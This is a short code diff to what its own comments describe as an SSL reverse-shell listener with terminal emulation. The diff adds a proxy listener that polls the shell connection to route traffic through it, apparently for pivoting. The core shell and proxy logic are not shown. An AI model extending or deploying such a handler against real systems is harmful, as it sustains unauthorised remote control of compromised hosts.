@@ -21,6 +21,7 @@
 #include "core.h"
 #include "vterm.h"
 #include "ssl.h"
+#include "proxy.h"
 
 ////////////////////////////////////////////////////////////////////////////////
 // wrapper class for vt100 terminal emulator using modified libvterm
@@ -61,6 +62,7 @@ int main(int argc, char **argv) {
     terminal tty;
     ssl_transport ssl;
     transport & tpt = ssl;
+    proxy_listener proxy;
     int read_count = 0;
     int write_count = 0;
     int rows, cols;
@@ -72,13 +74,13 @@ int main(int argc, char **argv) {
     if (argc > 1) {
         ssl.setopt(SSL_OPT_PORT, argv[1]);
     }
-
+    
     // wait for reverse shell to connect via SSL (blocking)
     if (tpt.init(TPT_SERVER) < 0) {
         LOG("fatal: failed to establish transport connection\n");
         exit(-1);
     }
-
+    
     // setup tty emulation and retrieve size of terminal window
     tty.init(&rows, &cols);
     
@@ -142,6 +144,9 @@ int main(int argc, char **argv) {
                 tpt.send(msg);
             }
         }
+
+        // handle proxy traffic routing
+        proxy.poll(ssl);
     }
 
     // tear down terminal emulation and reset window
